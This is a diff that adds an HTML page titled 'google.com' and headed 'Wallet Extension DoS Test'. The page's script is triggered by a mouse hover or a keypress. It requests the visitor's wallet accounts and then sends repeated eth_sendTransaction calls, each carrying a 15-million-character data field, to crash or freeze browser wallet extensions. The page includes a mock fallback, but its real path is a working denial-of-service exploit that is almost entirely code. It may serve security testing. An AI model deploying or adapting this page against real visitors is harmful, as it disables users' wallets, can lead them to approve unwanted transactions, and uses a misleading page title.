@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>google.com</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+      text-align: center;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 8px 0; font-size: 20px; color: #f87171; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 360px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; margin-top: 8px; font-weight: bold; }
+    .good { color: #7ee787; }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>Wallet Extension DoS Test</h1>
+    <p>Move your cursor over the page to initiate eth_sendTransaction spam with large data field (DoS via bytecode spam).</p>
+    <p class="warn">Warning: This can crash or freeze your wallet extension. Use mock mode for testing.</p>
+    <p>Press 'D' for manual trigger (trusted gesture).</p>
+    <pre id="output">Ready. Hover your cursor over this page to activate the handler.</pre>
+  </div>
+
+  <script>
+    // CONFIG
+    const DATA_LENGTH = 15000000; // Large data string size (15M chars)
+    const TX_COUNT = 5; // Number of transaction attempts (increase for more DoS)
+    const DELAY_MS = 500; // Delay between tx to avoid immediate block
+
+    const outEl = document.getElementById('output');
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Prepare large data (hex string of bytecode spam)
+    let largeData = null;
+    window.addEventListener('load', () => {
+      log(`Preparing large data field of length ${DATA_LENGTH}...`);
+      largeData = '0x' + 'a'.repeat(DATA_LENGTH - 2); // Hex string starting with 0x
+      log('Large data prepared. Hover your cursor to start the DoS.');
+    });
+
+    // Mock sendTransaction for testing
+    function mockSendTx(index) {
+      const fakeHash = `0xMOCKTXHASH_${index}_${Math.random().toString(36).slice(2,10)}`;
+      return Promise.resolve(fakeHash);
+    }
+
+    // Attempt real eth_sendTransaction with fallback
+    async function trySendTx(index, fromAddress) {
+      if (!window.ethereum) {
+        log(`No wallet detected — using mock tx for #${index}`);
+        return mockSendTx(index);
+      }
+
+      try {
+        const txHash = await ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: fromAddress,
+            to: '0x000000000000000000000000000000000000dEaD', // Burn address
+            value: '0x0',
+            data: largeData, // Large bytecode spam
+            gas: '0x5208', // Minimal gas
+            gasPrice: '0x3b9aca00'
+          }]
+        });
+        return txHash;
+      } catch (err) {
+        log(`Real tx attempt #${index} failed: ${err.message || err}. Falling back to mock.`);
+        return mockSendTx(index);
+      }
+    }
+
+    // Batch sendTransaction routine (large data DoS)
+    async function sendBatchHover() {
+      document.body.removeEventListener('mouseover', hoverHandler);
+
+      outEl.textContent = '';
+      log('Cursor detected. Starting eth_sendTransaction DoS with large data...');
+
+      if (!window.ethereum) {
+        log('No wallet detected. Using mock mode.');
+        for (let i = 1; i <= TX_COUNT; i++) {
+          const mhash = await mockSendTx(i);
+          log(`✅ Mock tx [${i}]: ${mhash}`);
+        }
+        log('Finished mock transactions.');
+        return;
+      }
+
+      let accounts;
+      try {
+        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      } catch (err) {
+        log('Account request failed/rejected. Using mock mode.');
+        for (let i = 1; i <= TX_COUNT; i++) {
+          const mhash = await mockSendTx(i);
+          log(`✅ Mock tx [${i}]: ${mhash}`);
+        }
+        log('Finished mock transactions after failed account request.');
+        return;
+      }
+
+      const from = accounts[0];
+      log(`Connected account: ${from}`);
+
+      for (let i = 1; i <= TX_COUNT; i++) {
+        log(`Attempting sendTransaction #${i} with large data...`);
+        const txHash = await trySendTx(i, from);
+        log(`✅ Result for #${i}: ${txHash}`);
+        await new Promise(resolve => setTimeout(resolve, DELAY_MS)); // Delay biar tidak terlalu cepat block
+      }
+
+      log('DoS attempt completed.');
+      document.body.addEventListener('mouseover', hoverHandler);
+    }
+
+    // Hover handler
+    let hoverTimeout = null;
+    function hoverHandler() {
+      if (hoverTimeout) return;
+      hoverTimeout = setTimeout(() => {
+        hoverTimeout = null;
+        sendBatchHover().catch(err => {
+          log('Unexpected error:', err);
+          document.body.addEventListener('mouseover', hoverHandler);
+        });
+      }, 100);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.addEventListener('mouseover', hoverHandler);
+      log('Hover listener active. Move cursor to trigger DoS.');
+    });
+
+    // Keyboard trigger for trusted gesture
+    window.addEventListener('keydown', async (e) => {
+      if (e.key.toLowerCase() === 'd') {
+        log('Manual trigger via "D" key!');
+        await sendBatchHover();
+      }
+    });
+  </script>
+</body>
+</html>
